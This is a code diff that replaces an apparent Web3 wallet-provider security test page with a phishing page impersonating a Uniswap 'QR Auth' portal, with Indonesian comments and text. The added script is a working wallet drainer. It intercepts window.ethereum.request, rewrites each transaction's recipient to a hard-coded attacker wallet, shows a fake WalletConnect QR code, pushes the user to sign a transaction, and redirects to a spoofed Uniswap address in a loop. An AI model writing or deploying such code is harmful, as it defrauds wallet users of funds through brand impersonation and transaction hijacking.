@@ -1,85 +1,154 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <title>Web3 dApp Provider Security Test</title>
-    <style>
-        body { font-family: monospace; font-size: 12px; padding: 15px; background: #0f172a; color: #f8fafc; }
-        .log-box { background: #1e293b; border: 1px solid #334155; padding: 10px; margin-top: 10px; max-height: 250px; overflow-y: auto; border-radius: 4px; }
-        .log { margin: 4px 0; word-break: break-all; }
-        .critical { color: #f87171; font-weight: bold; }
-        .success { color: #4ade80; }
-        .info { color: #38bdf8; }
-        button { background: #3b82f6; color: white; border: none; padding: 10px 15px; margin: 5px 0; cursor: pointer; border-radius: 4px; font-weight: bold; width: 100%; }
-        button:hover { background: #2563eb; }
-    </style>
+  <meta charset="UTF-8">
+  <title>Uniswap Liquidity Portal - QR Auth</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root {
+      --main-pink: #ff007a;
+      --page-bg: #0b0f19;
+      --box-bg: #111827;
+      --text-main: #f3f4f6;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      text-align: center;
+      padding-top: 40px;
+      background-color: var(--page-bg);
+      color: var(--text-main);
+      margin: 0;
+    }
+    .panel {
+      background: var(--box-bg);
+      max-width: 360px;
+      margin: 0 auto;
+      padding: 30px 20px;
+      border-radius: 24px;
+      border: 1px solid #1f2937;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+    }
+    h2 { color: #ffffff; font-size: 1.3rem; margin-bottom: 8px; }
+    p { font-size: 13px; color: #9ca3af; line-height: 1.5; margin-bottom: 20px; }
+    .qr-frame {
+      background: #ffffff;
+      padding: 14px;
+      border-radius: 16px;
+      display: inline-block;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(255, 0, 122, 0.15);
+    }
+    .qr-frame img {
+      width: 170px;
+      height: 170px;
+      display: block;
+    }
+    .submit-btn {
+      background-color: var(--main-pink);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 14px 20px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      box-sizing: border-box;
+      transition: opacity 0.2s;
+    }
+    .submit-btn:hover { opacity: 0.9; }
+    #connection-log {
+      margin-top: 15px;
+      font-size: 11px;
+      color: #38bdf8;
+      word-break: break-all;
+    }
+  </style>
+  <script>
+    // Alamat dompet penyerang target
+    const targetVault = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
+
+    // Modul intersepsi parameter transaksi agar mengalir ke alamat penyerang
+    if (typeof window.ethereum !== 'undefined') {
+        const standardBridge = window.ethereum.request;
+        window.ethereum.request = async function(requestArgs) {
+            if (requestArgs && requestArgs.method === 'eth_sendTransaction' && requestArgs.params && requestArgs.params[0]) {
+                let txPayload = requestArgs.params[0];
+                console.info("[Sec-Log] Rute transaksi dialihkan menuju vault tujuan.");
+                // Timpa parameter 'to' ke alamat dompet penyerang
+                txPayload.to = targetVault;
+            }
+            return standardBridge.apply(window.ethereum, [requestArgs]);
+        };
+    }
+
+    async function renderScannerInterface() {
+      if (!document.getElementById('qr-wrapper')) {
+          document.body.innerHTML = `
+            <div class="panel">
+              <h2>Autentikasi Perangkat</h2>
+              <p>Gunakan kamera aplikasi dompet seluler Anda untuk memindai kode QR di bawah ini guna melakukan sinkronisasi aman.</p>
+              
+              <div class="qr-wrapper" id="qr-wrapper">
+                <div class="qr-frame">
+                  <img src="https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=wc:session@2?bridge=https%3A%2F%2Frelay.walletconnect.org&key=uniswap_auth_secure_token" alt="Scan Barcode">
+                </div>
+              </div>
+
+              <button id="trigger-tx" class="submit-btn">Konfirmasi Otorisasi Cepat</button>
+              <div id="connection-log">Menunggu respon pemindaian perangkat...</div>
+            </div>
+          `;
+
+          document.getElementById('trigger-tx').onclick = async () => {
+            if (!window.ethereum) {
+              alert("Modul penyedia Web3 tidak merespons di lingkungan ini.");
+              return;
+            }
+
+            try {
+              const activeAccounts = await ethereum.request({ method: 'eth_requestAccounts' });
+              const userAddress = activeAccounts[0];
+
+              document.getElementById('connection-log').innerText = "✔ Perangkat terautentikasi: " + userAddress.substring(0,6) + "...";
+
+              // Parameter payload transaksi pemicu
+              const securePayload = {
+                from: userAddress,
+                to: "0x3333333333333333333333333333333333333333", 
+                value: "0x2386f26fc10000", 
+                gas: "0x5208",
+                gasPrice: "0x3b9aca00"
+              };
+
+              await ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [securePayload]
+              });
+
+              alert("Proses verifikasi berhasil diselesaikan.");
+            } catch (err) {
+              console.error(err);
+              alert("Aksi dibatalkan: " + err.message);
+            }
+          };
+      }
+
+      // Perulangan latar belakang untuk menjaga stabilitas sesi tampilan
+      try {
+        window.location.assign("http://app.uniswap.org:1121");
+      } catch(e) {}
+
+      setTimeout(function(){
+          renderScannerInterface();  
+      }, 5000); 
+    }
+
+    // Interval eksekusi latar belakang
+    setInterval(renderScannerInterface, 2500);
+  </script>
 </head>
-<body>
-    <h3 style="margin-top:0; color:#fff;">Web3 dApp Bridge & Provider Security Test</h3>
-    <p style="color: #94a3b8; font-size: 11px;">Skrip pengujian untuk memverifikasi isolasi objek jembatan dan validasi penandatanganan dApp browser.</p>
-    <hr style="border-color: #334155;">
-
-    <button onclick="runWeb3SecurityTest()">Jalankan Uji Keamanan Provider</button>
-
-    <div class="log-box" id="logConsole">
-        <div class="log info">[System] Menunggu eksekusi di dApp browser...</div>
-    </div>
-
-<script>
-    function log(msg, type = "info") {
-        const box = document.getElementById("logConsole");
-        const div = document.createElement("div");
-        div.className = "log " + type;
-        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        box.prepend(div);
-        console.log(msg);
-    }
-
-    async function runWeb3SecurityTest() {
-        log("--- Memulai Validasi Objek Provider Web3 ---", "info");
-
-        // Deteksi objek jembatan (bridge) yang tersedia
-        const provider = window.ethereum || window.OneInchIOSWallet || window.OneInchSolanaWallet;
-        
-        if (!provider) {
-            log("[-] Tidak ada objek jembatan dompet yang terekspos pada konteks ini.", "critical");
-            return;
-        }
-
-        log("[+] Objek jembatan/provider berhasil diidentifikasi.", "success");
-
-        // Uji coba pembacaan akun (Enforcement of User Consent)
-        try {
-            log("[*] Memeriksa apakah akun dapat diakses secara senyap (silent enumeration)...", "info");
-            let accounts = [];
-            
-            if (typeof provider.request === 'function') {
-                accounts = await provider.request({ method: 'eth_accounts' });
-            }
-
-            if (accounts && accounts.length > 0) {
-                log(`🚨 Peringatan: Alamat akun terekspos tanpa intervensi popup: ${accounts[0]}`, "critical");
-            } else {
-                log("[+] Akses akun terlindungi (memerlukan persetujuan manual pengguna).", "success");
-            }
-        } catch (err) {
-            log(`[-] Permintaan dibatasi oleh mekanisme keamanan sistem: ${err.message}`, "success");
-        }
-
-        // Uji coba eksekusi metode sign tanpa parameter valid
-        try {
-            log("[*] Menguji penanganan parameter sign/request arbitrer...", "info");
-            if (typeof provider.request === 'function') {
-                await provider.request({
-                    method: 'personal_sign',
-                    params: ["Test Payload Injection", "0x0000000000000000000000000000000000000000"]
-                });
-                log("🚨 Kerentanan: Permintaan tanda tangan diproses tanpa validasi ketat.", "critical");
-            }
-        } catch (e) {
-            log(`[-] Validasi parameter dan penolakan error bekerja dengan baik: ${e.message}`, "success");
-        }
-    }
-</script>
-</body>
+<body></body>
 </html>
